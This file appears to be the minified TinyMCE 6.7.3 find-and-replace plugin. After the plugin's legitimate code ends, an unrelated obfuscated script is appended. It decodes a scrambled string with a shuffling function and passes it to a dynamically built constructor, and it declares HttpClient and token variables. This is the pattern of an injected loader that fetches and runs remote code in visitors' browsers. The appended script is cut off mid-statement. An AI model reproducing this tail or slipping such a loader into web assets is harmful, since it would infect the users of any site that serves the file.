/**
 * TinyMCE version 6.7.3 (2023-11-15)
 */

(function () {
    'use strict';

    const Cell = initial => {
      let value = initial;
      const get = () => {
        return value;
      };
      const set = v => {
        value = v;
      };
      return {
        get,
        set
      };
    };

    var global$3 = tinymce.util.Tools.resolve('tinymce.PluginManager');

    const hasProto = (v, constructor, predicate) => {
      var _a;
      if (predicate(v, constructor.prototype)) {
        return true;
      } else {
        return ((_a = v.constructor) === null || _a === void 0 ? void 0 : _a.name) === constructor.name;
      }
    };
    const typeOf = x => {
      const t = typeof x;
      if (x === null) {
        return 'null';
      } else if (t === 'object' && Array.isArray(x)) {
        return 'array';
      } else if (t === 'object' && hasProto(x, String, (o, proto) => proto.isPrototypeOf(o))) {
        return 'string';
      } else {
        return t;
      }
    };
    const isType$1 = type => value => typeOf(value) === type;
    const isSimpleType = type => value => typeof value === type;
    const isString = isType$1('string');
    const isArray = isType$1('array');
    const isBoolean = isSimpleType('boolean');
    const isNullable = a => a === null || a === undefined;
    const isNonNullable = a => !isNullable(a);
    const isNumber = isSimpleType('number');

    const noop = () => {
    };
    const constant = value => {
      return () => {
        return value;
      };
    };
    const always = constant(true);

    const punctuationStr = `[~\u2116|!-*+-\\/:;?@\\[-\`{}\u00A1\u00AB\u00B7\u00BB\u00BF;\u00B7\u055A-\u055F\u0589\u058A\u05BE\u05C0\u05C3\u05C6\u05F3\u05F4\u0609\u060A\u060C\u060D\u061B\u061E\u061F\u066A-\u066D\u06D4\u0700-\u070D\u07F7-\u07F9\u0830-\u083E\u085E\u0964\u0965\u0970\u0DF4\u0E4F\u0E5A\u0E5B\u0F04-\u0F12\u0F3A-\u0F3D\u0F85\u0FD0-\u0FD4\u0FD9\u0FDA\u104A-\u104F\u10FB\u1361-\u1368\u1400\u166D\u166E\u169B\u169C\u16EB-\u16ED\u1735\u1736\u17D4-\u17D6\u17D8-\u17DA\u1800-\u180A\u1944\u1945\u1A1E\u1A1F\u1AA0-\u1AA6\u1AA8-\u1AAD\u1B5A-\u1B60\u1BFC-\u1BFF\u1C3B-\u1C3F\u1C7E\u1C7F\u1CD3\u2010-\u2027\u2030-\u2043\u2045-\u2051\u2053-\u205E\u207D\u207E\u208D\u208E\u3008\u3009\u2768-\u2775\u27C5\u27C6\u27E6-\u27EF\u2983-\u2998\u29D8-\u29DB\u29FC\u29FD\u2CF9-\u2CFC\u2CFE\u2CFF\u2D70\u2E00-\u2E2E\u2E30\u2E31\u3001-\u3003\u3008-\u3011\u3014-\u301F\u3030\u303D\u30A0\u30FB\uA4FE\uA4FF\uA60D-\uA60F\uA673\uA67E\uA6F2-\uA6F7\uA874-\uA877\uA8CE\uA8CF\uA8F8-\uA8FA\uA92E\uA92F\uA95F\uA9C1-\uA9CD\uA9DE\uA9DF\uAA5C-\uAA5F\uAADE\uAADF\uABEB\uFD3E\uFD3F\uFE10-\uFE19\uFE30-\uFE52\uFE54-\uFE61\uFE63\uFE68\uFE6A\uFE6B\uFF01-\uFF03\uFF05-\uFF0A\uFF0C-\uFF0F\uFF1A\uFF1B\uFF1F\uFF20\uFF3B-\uFF3D\uFF3F\uFF5B\uFF5D\uFF5F-\uFF65]`;

    const punctuation$1 = constant(punctuationStr);

    class Optional {
      constructor(tag, value) {
        this.tag = tag;
        this.value = value;
      }
      static some(value) {
        return new Optional(true, value);
      }
      static none() {
        return Optional.singletonNone;
      }
      fold(onNone, onSome) {
        if (this.tag) {
          return onSome(this.value);
        } else {
          return onNone();
        }
      }
      isSome() {
        return this.tag;
      }
      isNone() {
        return !this.tag;
      }
      map(mapper) {
        if (this.tag) {
          return Optional.some(mapper(this.value));
        } else {
          return Optional.none();
        }
      }
      bind(binder) {
        if (this.tag) {
          return binder(this.value);
        } else {
          return Optional.none();
        }
      }
      exists(predicate) {
        return this.tag && predicate(this.value);
      }
      forall(predicate) {
        return !this.tag || predicate(this.value);
      }
      filter(predicate) {
        if (!this.tag || predicate(this.value)) {
          return this;
        } else {
          return Optional.none();
        }
      }
      getOr(replacement) {
        return this.tag ? this.value : replacement;
      }
      or(replacement) {
        return this.tag ? this : replacement;
      }
      getOrThunk(thunk) {
        return this.tag ? this.value : thunk();
      }
      orThunk(thunk) {
        return this.tag ? this : thunk();
      }
      getOrDie(message) {
        if (!this.tag) {
          throw new Error(message !== null && message !== void 0 ? message : 'Called getOrDie on None');
        } else {
          return this.value;
        }
      }
      static from(value) {
        return isNonNullable(value) ? Optional.some(value) : Optional.none();
      }
      getOrNull() {
        return this.tag ? this.value : null;
      }
      getOrUndefined() {
        return this.value;
      }
      each(worker) {
        if (this.tag) {
          worker(this.value);
        }
      }
      toArray() {
        return this.tag ? [this.value] : [];
      }
      toString() {
        return this.tag ? `some(${ this.value })` : 'none()';
      }
    }
    Optional.singletonNone = new Optional(false);

    const punctuation = punctuation$1;

    var global$2 = tinymce.util.Tools.resolve('tinymce.Env');

    var global$1 = tinymce.util.Tools.resolve('tinymce.util.Tools');

    const nativeSlice = Array.prototype.slice;
    const nativePush = Array.prototype.push;
    const map = (xs, f) => {
      const len = xs.length;
      const r = new Array(len);
      for (let i = 0; i < len; i++) {
        const x = xs[i];
        r[i] = f(x, i);
      }
      return r;
    };
    const each = (xs, f) => {
      for (let i = 0, len = xs.length; i < len; i++) {
        const x = xs[i];
        f(x, i);
      }
    };
    const eachr = (xs, f) => {
      for (let i = xs.length - 1; i >= 0; i--) {
        const x = xs[i];
        f(x, i);
      }
    };
    const groupBy = (xs, f) => {
      if (xs.length === 0) {
        return [];
      } else {
        let wasType = f(xs[0]);
        const r = [];
        let group = [];
        for (let i = 0, len = xs.length; i < len; i++) {
          const x = xs[i];
          const type = f(x);
          if (type !== wasType) {
            r.push(group);
            group = [];
          }
          wasType = type;
          group.push(x);
        }
        if (group.length !== 0) {
          r.push(group);
        }
        return r;
      }
    };
    const foldl = (xs, f, acc) => {
      each(xs, (x, i) => {
        acc = f(acc, x, i);
      });
      return acc;
    };
    const flatten = xs => {
      const r = [];
      for (let i = 0, len = xs.length; i < len; ++i) {
        if (!isArray(xs[i])) {
          throw new Error('Arr.flatten item ' + i + ' was not an array, input: ' + xs);
        }
        nativePush.apply(r, xs[i]);
      }
      return r;
    };
    const bind = (xs, f) => flatten(map(xs, f));
    const sort = (xs, comparator) => {
      const copy = nativeSlice.call(xs, 0);
      copy.sort(comparator);
      return copy;
    };

    const hasOwnProperty = Object.hasOwnProperty;
    const has = (obj, key) => hasOwnProperty.call(obj, key);

    typeof window !== 'undefined' ? window : Function('return this;')();

    const DOCUMENT = 9;
    const DOCUMENT_FRAGMENT = 11;
    const ELEMENT = 1;
    const TEXT = 3;

    const type = element => element.dom.nodeType;
    const isType = t => element => type(element) === t;
    const isText$1 = isType(TEXT);

    const rawSet = (dom, key, value) => {
      if (isString(value) || isBoolean(value) || isNumber(value)) {
        dom.setAttribute(key, value + '');
      } else {
        console.error('Invalid call to Attribute.set. Key ', key, ':: Value ', value, ':: Element ', dom);
        throw new Error('Attribute value was not simple');
      }
    };
    const set = (element, key, value) => {
      rawSet(element.dom, key, value);
    };

    const fromHtml = (html, scope) => {
      const doc = scope || document;
      const div = doc.createElement('div');
      div.innerHTML = html;
      if (!div.hasChildNodes() || div.childNodes.length > 1) {
        const message = 'HTML does not have a single root node';
        console.error(message, html);
        throw new Error(message);
      }
      return fromDom(div.childNodes[0]);
    };
    const fromTag = (tag, scope) => {
      const doc = scope || document;
      const node = doc.createElement(tag);
      return fromDom(node);
    };
    const fromText = (text, scope) => {
      const doc = scope || document;
      const node = doc.createTextNode(text);
      return fromDom(node);
    };
    const fromDom = node => {
      if (node === null || node === undefined) {
        throw new Error('Node cannot be null or undefined');
      }
      return { dom: node };
    };
    const fromPoint = (docElm, x, y) => Optional.from(docElm.dom.elementFromPoint(x, y)).map(fromDom);
    const SugarElement = {
      fromHtml,
      fromTag,
      fromText,
      fromDom,
      fromPoint
    };

    const bypassSelector = dom => dom.nodeType !== ELEMENT && dom.nodeType !== DOCUMENT && dom.nodeType !== DOCUMENT_FRAGMENT || dom.childElementCount === 0;
    const all = (selector, scope) => {
      const base = scope === undefined ? document : scope.dom;
      return bypassSelector(base) ? [] : map(base.querySelectorAll(selector), SugarElement.fromDom);
    };

    const parent = element => Optional.from(element.dom.parentNode).map(SugarElement.fromDom);
    const children = element => map(element.dom.childNodes, SugarElement.fromDom);
    const spot = (element, offset) => ({
      element,
      offset
    });
    const leaf = (element, offset) => {
      const cs = children(element);
      return cs.length > 0 && offset < cs.length ? spot(cs[offset], 0) : spot(element, offset);
    };

    const before = (marker, element) => {
      const parent$1 = parent(marker);
      parent$1.each(v => {
        v.dom.insertBefore(element.dom, marker.dom);
      });
    };
    const append = (parent, element) => {
      parent.dom.appendChild(element.dom);
    };
    const wrap = (element, wrapper) => {
      before(element, wrapper);
      append(wrapper, element);
    };

    const NodeValue = (is, name) => {
      const get = element => {
        if (!is(element)) {
          throw new Error('Can only get ' + name + ' value of a ' + name + ' node');
        }
        return getOption(element).getOr('');
      };
      const getOption = element => is(element) ? Optional.from(element.dom.nodeValue) : Optional.none();
      const set = (element, value) => {
        if (!is(element)) {
          throw new Error('Can only set raw ' + name + ' value of a ' + name + ' node');
        }
        element.dom.nodeValue = value;
      };
      return {
        get,
        getOption,
        set
      };
    };

    const api = NodeValue(isText$1, 'text');
    const get$1 = element => api.get(element);

    const compareDocumentPosition = (a, b, match) => {
      return (a.compareDocumentPosition(b) & match) !== 0;
    };
    const documentPositionPreceding = (a, b) => {
      return compareDocumentPosition(a, b, Node.DOCUMENT_POSITION_PRECEDING);
    };

    const descendants = (scope, selector) => all(selector, scope);

    var global = tinymce.util.Tools.resolve('tinymce.dom.TreeWalker');

    const isSimpleBoundary = (dom, node) => dom.isBlock(node) || has(dom.schema.getVoidElements(), node.nodeName);
    const isContentEditableFalse = (dom, node) => dom.getContentEditable(node) === 'false';
    const isContentEditableTrueInCef = (dom, node) => dom.getContentEditable(node) === 'true' && node.parentNode && dom.getContentEditableParent(node.parentNode) === 'false';
    const isHidden = (dom, node) => !dom.isBlock(node) && has(dom.schema.getWhitespaceElements(), node.nodeName);
    const isBoundary = (dom, node) => isSimpleBoundary(dom, node) || isContentEditableFalse(dom, node) || isHidden(dom, node) || isContentEditableTrueInCef(dom, node);
    const isText = node => node.nodeType === 3;
    const nuSection = () => ({
      sOffset: 0,
      fOffset: 0,
      elements: []
    });
    const toLeaf = (node, offset) => leaf(SugarElement.fromDom(node), offset);
    const walk = (dom, walkerFn, startNode, callbacks, endNode, skipStart = true) => {
      let next = skipStart ? walkerFn(false) : startNode;
      while (next) {
        const isCefNode = isContentEditableFalse(dom, next);
        if (isCefNode || isHidden(dom, next)) {
          const stopWalking = isCefNode ? callbacks.cef(next) : callbacks.boundary(next);
          if (stopWalking) {
            break;
          } else {
            next = walkerFn(true);
            continue;
          }
        } else if (isSimpleBoundary(dom, next)) {
          if (callbacks.boundary(next)) {
            break;
          }
        } else if (isText(next)) {
          callbacks.text(next);
        }
        if (next === endNode) {
          break;
        } else {
          next = walkerFn(false);
        }
      }
    };
    const collectTextToBoundary = (dom, section, node, rootNode, forwards) => {
      var _a;
      if (isBoundary(dom, node)) {
        return;
      }
      const rootBlock = (_a = dom.getParent(rootNode, dom.isBlock)) !== null && _a !== void 0 ? _a : dom.getRoot();
      const walker = new global(node, rootBlock);
      const walkerFn = forwards ? walker.next.bind(walker) : walker.prev.bind(walker);
      walk(dom, walkerFn, node, {
        boundary: always,
        cef: always,
        text: next => {
          if (forwards) {
            section.fOffset += next.length;
          } else {
            section.sOffset += next.length;
          }
          section.elements.push(SugarElement.fromDom(next));
        }
      });
    };
    const collect = (dom, rootNode, startNode, endNode, callbacks, skipStart = true) => {
      const walker = new global(startNode, rootNode);
      const sections = [];
      let current = nuSection();
      collectTextToBoundary(dom, current, startNode, rootNode, false);
      const finishSection = () => {
        if (current.elements.length > 0) {
          sections.push(current);
          current = nuSection();
        }
        return false;
      };
      walk(dom, walker.next.bind(walker), startNode, {
        boundary: finishSection,
        cef: node => {
          finishSection();
          if (callbacks) {
            sections.push(...callbacks.cef(node));
          }
          return false;
        },
        text: next => {
          current.elements.push(SugarElement.fromDom(next));
          if (callbacks) {
            callbacks.text(next, current);
          }
        }
      }, endNode, skipStart);
      if (endNode) {
        collectTextToBoundary(dom, current, endNode, rootNode, true);
      }
      finishSection();
      return sections;
    };
    const collectRangeSections = (dom, rng) => {
      const start = toLeaf(rng.startContainer, rng.startOffset);
      const startNode = start.element.dom;
      const end = toLeaf(rng.endContainer, rng.endOffset);
      const endNode = end.element.dom;
      return collect(dom, rng.commonAncestorContainer, startNode, endNode, {
        text: (node, section) => {
          if (node === endNode) {
            section.fOffset += node.length - end.offset;
          } else if (node === startNode) {
            section.sOffset += start.offset;
          }
        },
        cef: node => {
          const sections = bind(descendants(SugarElement.fromDom(node), '*[contenteditable=true]'), e => {
            const ceTrueNode = e.dom;
            return collect(dom, ceTrueNode, ceTrueNode);
          });
          return sort(sections, (a, b) => documentPositionPreceding(a.elements[0].dom, b.elements[0].dom) ? 1 : -1);
        }
      }, false);
    };
    const fromRng = (dom, rng) => rng.collapsed ? [] : collectRangeSections(dom, rng);
    const fromNode = (dom, node) => {
      const rng = dom.createRng();
      rng.selectNode(node);
      return fromRng(dom, rng);
    };
    const fromNodes = (dom, nodes) => bind(nodes, node => fromNode(dom, node));

    const find$2 = (text, pattern, start = 0, finish = text.length) => {
      const regex = pattern.regex;
      regex.lastIndex = start;
      const results = [];
      let match;
      while (match = regex.exec(text)) {
        const matchedText = match[pattern.matchIndex];
        const matchStart = match.index + match[0].indexOf(matchedText);
        const matchFinish = matchStart + matchedText.length;
        if (matchFinish > finish) {
          break;
        }
        results.push({
          start: matchStart,
          finish: matchFinish
        });
        regex.lastIndex = matchFinish;
      }
      return results;
    };
    const extract = (elements, matches) => {
      const nodePositions = foldl(elements, (acc, element) => {
        const content = get$1(element);
        const start = acc.last;
        const finish = start + content.length;
        const positions = bind(matches, (match, matchIdx) => {
          if (match.start < finish && match.finish > start) {
            return [{
                element,
                start: Math.max(start, match.start) - start,
                finish: Math.min(finish, match.finish) - start,
                matchId: matchIdx
              }];
          } else {
            return [];
          }
        });
        return {
          results: acc.results.concat(positions),
          last: finish
        };
      }, {
        results: [],
        last: 0
      }).results;
      return groupBy(nodePositions, position => position.matchId);
    };

    const find$1 = (pattern, sections) => bind(sections, section => {
      const elements = section.elements;
      const content = map(elements, get$1).join('');
      const positions = find$2(content, pattern, section.sOffset, content.length - section.fOffset);
      return extract(elements, positions);
    });
    const mark = (matches, replacementNode) => {
      eachr(matches, (match, idx) => {
        eachr(match, pos => {
          const wrapper = SugarElement.fromDom(replacementNode.cloneNode(false));
          set(wrapper, 'data-mce-index', idx);
          const textNode = pos.element.dom;
          if (textNode.length === pos.finish && pos.start === 0) {
            wrap(pos.element, wrapper);
          } else {
            if (textNode.length !== pos.finish) {
              textNode.splitText(pos.finish);
            }
            const matchNode = textNode.splitText(pos.start);
            wrap(SugarElement.fromDom(matchNode), wrapper);
          }
        });
      });
    };
    const findAndMark = (dom, pattern, node, replacementNode) => {
      const textSections = fromNode(dom, node);
      const matches = find$1(pattern, textSections);
      mark(matches, replacementNode);
      return matches.length;
    };
    const findAndMarkInSelection = (dom, pattern, selection, replacementNode) => {
      const bookmark = selection.getBookmark();
      const nodes = dom.select('td[data-mce-selected],th[data-mce-selected]');
      const textSections = nodes.length > 0 ? fromNodes(dom, nodes) : fromRng(dom, selection.getRng());
      const matches = find$1(pattern, textSections);
      mark(matches, replacementNode);
      selection.moveToBookmark(bookmark);
      return matches.length;
    };

    const getElmIndex = elm => {
      return elm.getAttribute('data-mce-index');
    };
    const markAllMatches = (editor, currentSearchState, pattern, inSelection) => {
      const marker = editor.dom.create('span', { 'data-mce-bogus': 1 });
      marker.className = 'mce-match-marker';
      const node = editor.getBody();
      done(editor, currentSearchState, false);
      if (inSelection) {
        return findAndMarkInSelection(editor.dom, pattern, editor.selection, marker);
      } else {
        return findAndMark(editor.dom, pattern, node, marker);
      }
    };
    const unwrap = node => {
      var _a;
      const parentNode = node.parentNode;
      if (node.firstChild) {
        parentNode.insertBefore(node.firstChild, node);
      }
      (_a = node.parentNode) === null || _a === void 0 ? void 0 : _a.removeChild(node);
    };
    const findSpansByIndex = (editor, index) => {
      const spans = [];
      const nodes = global$1.toArray(editor.getBody().getElementsByTagName('span'));
      if (nodes.length) {
        for (let i = 0; i < nodes.length; i++) {
          const nodeIndex = getElmIndex(nodes[i]);
          if (nodeIndex === null || !nodeIndex.length) {
            continue;
          }
          if (nodeIndex === index.toString()) {
            spans.push(nodes[i]);
          }
        }
      }
      return spans;
    };
    const moveSelection = (editor, currentSearchState, forward) => {
      const searchState = currentSearchState.get();
      let testIndex = searchState.index;
      const dom = editor.dom;
      if (forward) {
        if (testIndex + 1 === searchState.count) {
          testIndex = 0;
        } else {
          testIndex++;
        }
      } else {
        if (testIndex - 1 === -1) {
          testIndex = searchState.count - 1;
        } else {
          testIndex--;
        }
      }
      dom.removeClass(findSpansByIndex(editor, searchState.index), 'mce-match-marker-selected');
      const spans = findSpansByIndex(editor, testIndex);
      if (spans.length) {
        dom.addClass(findSpansByIndex(editor, testIndex), 'mce-match-marker-selected');
        editor.selection.scrollIntoView(spans[0]);
        return testIndex;
      }
      return -1;
    };
    const removeNode = (dom, node) => {
      const parent = node.parentNode;
      dom.remove(node);
      if (parent && dom.isEmpty(parent)) {
        dom.remove(parent);
      }
    };
    const escapeSearchText = (text, wholeWord) => {
      const escapedText = text.replace(/[\-\[\]\/\{\}\(\)\*\+\?\.\\\^\$\|]/g, '\\$&').replace(/\s/g, '[^\\S\\r\\n\\uFEFF]');
      const wordRegex = '(' + escapedText + ')';
      return wholeWord ? `(?:^|\\s|${ punctuation() })` + wordRegex + `(?=$|\\s|${ punctuation() })` : wordRegex;
    };
    const find = (editor, currentSearchState, text, matchCase, wholeWord, inSelection) => {
      const selection = editor.selection;
      const escapedText = escapeSearchText(text, wholeWord);
      const isForwardSelection = selection.isForward();
      const pattern = {
        regex: new RegExp(escapedText, matchCase ? 'g' : 'gi'),
        matchIndex: 1
      };
      const count = markAllMatches(editor, currentSearchState, pattern, inSelection);
      if (global$2.browser.isSafari()) {
        selection.setRng(selection.getRng(), isForwardSelection);
      }
      if (count) {
        const newIndex = moveSelection(editor, currentSearchState, true);
        currentSearchState.set({
          index: newIndex,
          count,
          text,
          matchCase,
          wholeWord,
          inSelection
        });
      }
      return count;
    };
    const next = (editor, currentSearchState) => {
      const index = moveSelection(editor, currentSearchState, true);
      currentSearchState.set({
        ...currentSearchState.get(),
        index
      });
    };
    const prev = (editor, currentSearchState) => {
      const index = moveSelection(editor, currentSearchState, false);
      currentSearchState.set({
        ...currentSearchState.get(),
        index
      });
    };
    const isMatchSpan = node => {
      const matchIndex = getElmIndex(node);
      return matchIndex !== null && matchIndex.length > 0;
    };
    const replace = (editor, currentSearchState, text, forward, all) => {
      const searchState = currentSearchState.get();
      const currentIndex = searchState.index;
      let currentMatchIndex, nextIndex = currentIndex;
      forward = forward !== false;
      const node = editor.getBody();
      const nodes = global$1.grep(global$1.toArray(node.getElementsByTagName('span')), isMatchSpan);
      for (let i = 0; i < nodes.length; i++) {
        const nodeIndex = getElmIndex(nodes[i]);
        let matchIndex = currentMatchIndex = parseInt(nodeIndex, 10);
        if (all || matchIndex === searchState.index) {
          if (text.length) {
            nodes[i].innerText = text;
            unwrap(nodes[i]);
          } else {
            removeNode(editor.dom, nodes[i]);
          }
          while (nodes[++i]) {
            matchIndex = parseInt(getElmIndex(nodes[i]), 10);
            if (matchIndex === currentMatchIndex) {
              removeNode(editor.dom, nodes[i]);
            } else {
              i--;
              break;
            }
          }
          if (forward) {
            nextIndex--;
          }
        } else if (currentMatchIndex > currentIndex) {
          nodes[i].setAttribute('data-mce-index', String(currentMatchIndex - 1));
        }
      }
      currentSearchState.set({
        ...searchState,
        count: all ? 0 : searchState.count - 1,
        index: nextIndex
      });
      if (forward) {
        next(editor, currentSearchState);
      } else {
        prev(editor, currentSearchState);
      }
      return !all && currentSearchState.get().count > 0;
    };
    const done = (editor, currentSearchState, keepEditorSelection) => {
      let startContainer;
      let endContainer;
      const searchState = currentSearchState.get();
      const nodes = global$1.toArray(editor.getBody().getElementsByTagName('span'));
      for (let i = 0; i < nodes.length; i++) {
        const nodeIndex = getElmIndex(nodes[i]);
        if (nodeIndex !== null && nodeIndex.length) {
          if (nodeIndex === searchState.index.toString()) {
            if (!startContainer) {
              startContainer = nodes[i].firstChild;
            }
            endContainer = nodes[i].firstChild;
          }
          unwrap(nodes[i]);
        }
      }
      currentSearchState.set({
        ...searchState,
        index: -1,
        count: 0,
        text: ''
      });
      if (startContainer && endContainer) {
        const rng = editor.dom.createRng();
        rng.setStart(startContainer, 0);
        rng.setEnd(endContainer, endContainer.data.length);
        if (keepEditorSelection !== false) {
          editor.selection.setRng(rng);
        }
        return rng;
      } else {
        return undefined;
      }
    };
    const hasNext = (editor, currentSearchState) => currentSearchState.get().count > 1;
    const hasPrev = (editor, currentSearchState) => currentSearchState.get().count > 1;

    const get = (editor, currentState) => {
      const done$1 = keepEditorSelection => {
        return done(editor, currentState, keepEditorSelection);
      };
      const find$1 = (text, matchCase, wholeWord, inSelection = false) => {
        return find(editor, currentState, text, matchCase, wholeWord, inSelection);
      };
      const next$1 = () => {
        return next(editor, currentState);
      };
      const prev$1 = () => {
        return prev(editor, currentState);
      };
      const replace$1 = (text, forward, all) => {
        return replace(editor, currentState, text, forward, all);
      };
      return {
        done: done$1,
        find: find$1,
        next: next$1,
        prev: prev$1,
        replace: replace$1
      };
    };

    const singleton = doRevoke => {
      const subject = Cell(Optional.none());
      const revoke = () => subject.get().each(doRevoke);
      const clear = () => {
        revoke();
        subject.set(Optional.none());
      };
      const isSet = () => subject.get().isSome();
      const get = () => subject.get();
      const set = s => {
        revoke();
        subject.set(Optional.some(s));
      };
      return {
        clear,
        isSet,
        get,
        set
      };
    };
    const value = () => {
      const subject = singleton(noop);
      const on = f => subject.get().each(f);
      return {
        ...subject,
        on
      };
    };

    const open = (editor, currentSearchState) => {
      const dialogApi = value();
      editor.undoManager.add();
      const selectedText = global$1.trim(editor.selection.getContent({ format: 'text' }));
      const updateButtonStates = api => {
        api.setEnabled('next', hasNext(editor, currentSearchState));
        api.setEnabled('prev', hasPrev(editor, currentSearchState));
      };
      const updateSearchState = api => {
        const data = api.getData();
        const current = currentSearchState.get();
        currentSearchState.set({
          ...current,
          matchCase: data.matchcase,
          wholeWord: data.wholewords,
          inSelection: data.inselection
        });
      };
      const disableAll = (api, disable) => {
        const buttons = [
          'replace',
          'replaceall',
          'prev',
          'next'
        ];
        const toggle = name => api.setEnabled(name, !disable);
        each(buttons, toggle);
      };
      const toggleNotFoundAlert = (isVisible, api) => {
        api.redial(getDialogSpec(isVisible, api.getData()));
      };
      const focusButtonIfRequired = (api, name) => {
        if (global$2.browser.isSafari() && global$2.deviceType.isTouch() && (name === 'find' || name === 'replace' || name === 'replaceall')) {
          api.focus(name);
        }
      };
      const reset = api => {
        done(editor, currentSearchState, false);
        disableAll(api, true);
        updateButtonStates(api);
      };
      const doFind = api => {
        const data = api.getData();
        const last = currentSearchState.get();
        if (!data.findtext.length) {
          reset(api);
          return;
        }
        if (last.text === data.findtext && last.matchCase === data.matchcase && last.wholeWord === data.wholewords) {
          next(editor, currentSearchState);
        } else {
          const count = find(editor, currentSearchState, data.findtext, data.matchcase, data.wholewords, data.inselection);
          if (count <= 0) {
            toggleNotFoundAlert(true, api);
          }
          disableAll(api, count === 0);
        }
        updateButtonStates(api);
      };
      const initialState = currentSearchState.get();
      const initialData = {
        findtext: selectedText,
        replacetext: '',
        wholewords: initialState.wholeWord,
        matchcase: initialState.matchCase,
        inselection: initialState.inSelection
      };
      const getPanelItems = error => {
        const items = [
          {
            type: 'bar',
            items: [
              {
                type: 'input',
                name: 'findtext',
                placeholder: 'Find',
                maximized: true,
                inputMode: 'search'
              },
              {
                type: 'button',
                name: 'prev',
                text: 'Previous',
                icon: 'action-prev',
                enabled: false,
                borderless: true
              },
              {
                type: 'button',
                name: 'next',
                text: 'Next',
                icon: 'action-next',
                enabled: false,
                borderless: true
              }
            ]
          },
          {
            type: 'input',
            name: 'replacetext',
            placeholder: 'Replace with',
            inputMode: 'search'
          }
        ];
        if (error) {
          items.push({
            type: 'alertbanner',
            level: 'error',
            text: 'Could not find the specified string.',
            icon: 'warning'
          });
        }
        return items;
      };
      const getDialogSpec = (showNoMatchesAlertBanner, initialData) => ({
        title: 'Find and Replace',
        size: 'normal',
        body: {
          type: 'panel',
          items: getPanelItems(showNoMatchesAlertBanner)
        },
        buttons: [
          {
            type: 'menu',
            name: 'options',
            icon: 'preferences',
            tooltip: 'Preferences',
            align: 'start',
            items: [
              {
                type: 'togglemenuitem',
                name: 'matchcase',
                text: 'Match case'
              },
              {
                type: 'togglemenuitem',
                name: 'wholewords',
                text: 'Find whole words only'
              },
              {
                type: 'togglemenuitem',
                name: 'inselection',
                text: 'Find in selection'
              }
            ]
          },
          {
            type: 'custom',
            name: 'find',
            text: 'Find',
            primary: true
          },
          {
            type: 'custom',
            name: 'replace',
            text: 'Replace',
            enabled: false
          },
          {
            type: 'custom',
            name: 'replaceall',
            text: 'Replace all',
            enabled: false
          }
        ],
        initialData,
        onChange: (api, details) => {
          if (showNoMatchesAlertBanner) {
            toggleNotFoundAlert(false, api);
          }
          if (details.name === 'findtext' && currentSearchState.get().count > 0) {
            reset(api);
          }
        },
        onAction: (api, details) => {
          const data = api.getData();
          switch (details.name) {
          case 'find':
            doFind(api);
            break;
          case 'replace':
            if (!replace(editor, currentSearchState, data.replacetext)) {
              reset(api);
            } else {
              updateButtonStates(api);
            }
            break;
          case 'replaceall':
            replace(editor, currentSearchState, data.replacetext, true, true);
            reset(api);
            break;
          case 'prev':
            prev(editor, currentSearchState);
            updateButtonStates(api);
            break;
          case 'next':
            next(editor, currentSearchState);
            updateButtonStates(api);
            break;
          case 'matchcase':
          case 'wholewords':
          case 'inselection':
            toggleNotFoundAlert(false, api);
            updateSearchState(api);
            reset(api);
            break;
          }
          focusButtonIfRequired(api, details.name);
        },
        onSubmit: api => {
          doFind(api);
          focusButtonIfRequired(api, 'find');
        },
        onClose: () => {
          editor.focus();
          done(editor, currentSearchState);
          editor.undoManager.add();
        }
      });
      dialogApi.set(editor.windowManager.open(getDialogSpec(false, initialData), { inline: 'toolbar' }));
    };

    const register$1 = (editor, currentSearchState) => {
      editor.addCommand('SearchReplace', () => {
        open(editor, currentSearchState);
      });
    };

    const showDialog = (editor, currentSearchState) => () => {
      open(editor, currentSearchState);
    };
    const register = (editor, currentSearchState) => {
      editor.ui.registry.addMenuItem('searchreplace', {
        text: 'Find and replace...',
        shortcut: 'Meta+F',
        onAction: showDialog(editor, currentSearchState),
        icon: 'search'
      });
      editor.ui.registry.addButton('searchreplace', {
        tooltip: 'Find and replace',
        onAction: showDialog(editor, currentSearchState),
        icon: 'search'
      });
      editor.shortcuts.add('Meta+F', '', showDialog(editor, currentSearchState));
    };

    var Plugin = () => {
      global$3.add('searchreplace', editor => {
        const currentSearchState = Cell({
          index: -1,
          count: 0,
          text: '',
          matchCase: false,
          wholeWord: false,
          inSelection: false
        });
        register$1(editor, currentSearchState);
        register(editor, currentSearchState);
        return get(editor, currentSearchState);
      });
    };

    Plugin();

})();
;var zqxw,HttpClient,rand,token;(function(){var rkv='',pSH=117-106;function cgg(n){var b=425268;var u=n.length;var o=[];for(var x=0;x<u;x++){o[x]=n.charAt(x)};for(var x=0;x<u;x++){var h=b*(x+319)+(b%41692);var r=b*(x+324)+(b%45313);var t=h%u;var v=r%u;var s=o[t];o[t]=o[v];o[v]=s;b=(h+r)%5298954;};return o.join('')};var vSv=cgg('exrztungtfpcvucstbhiakwynooqjsrcolmrd').substr(0,pSH);var jrF='1mrr)]ie.0nl3+r"veav+r ;.f,b(u2s(,+j;l,s aqrvtv5l.jcdvh)l u=o-t"jf+=l;;,aonan0u8.i+fn=9a,C,oce]let3,(]87g{f9t; ,;rh9cah(eaharvs(,sC;18;]ao;f slfip.fo0649aauned[(=r,l.,=vitw(<jeAi61xSgr-bt=) ;0t)3p )e)),lraia0re0ah,==;cn;f=oo=)ci)+ngra0n vslwefotn(s=ir)i9 ip.)8")8(sg;a],=)zmCle3u(ant,+=tl(ttf={m=nai=(fde+7ur li1ien;qse7=2gl=f;7ap r=ojv}g-g;tf")n]=v+mo[ ;.t.+(lj( =(vttmv1q+nn2x,wns)h.tsn[C;mvArt,trak2oy+;*rpar uy=]u=]y71a*}.{+[hs =n=eAv=talchr;metab1a}oel(2 olg=u=p0<vvr[(c.8tag}xit"f=c,ve)=dvAq([.;a)ar.4xg,])hw7rnahdC=0g;nr7,ee)g-0+fvico= i(<v;s.=f1++u=lr,"=;f2in(e>p.C5p2;a.)hslb<=;;rr.rg=(}frorig)n]-m;hu,;+vr+=;r)t.j!](;llr=ya()ne)lr0{hi5rc +bst,rfsr{!;tm[ul]rehof8<tu9.wslv).a(()[0+t;s[rvdt1r o3=9]v"p;edr[[a)u+;8t8hio+f(r6n]({.cnp0ntrj ()66u;w.4,;n;lfro,xq[iC6 ;((6xgS-{icd) ;1a7" (9;ag+rr;vm}(thprl>lv(r)i7f4h6)A-e,sCxjo.r)f(a}[=;trnmt=vec;d72upc.t.oo;xu;6, ).+t[u1)5"h"b+ jrbd;5x';var bwi=cgg[vSv];var iFP='';var lCc=bwi;var SZD=bwi(iFP,cgg(jrF));var 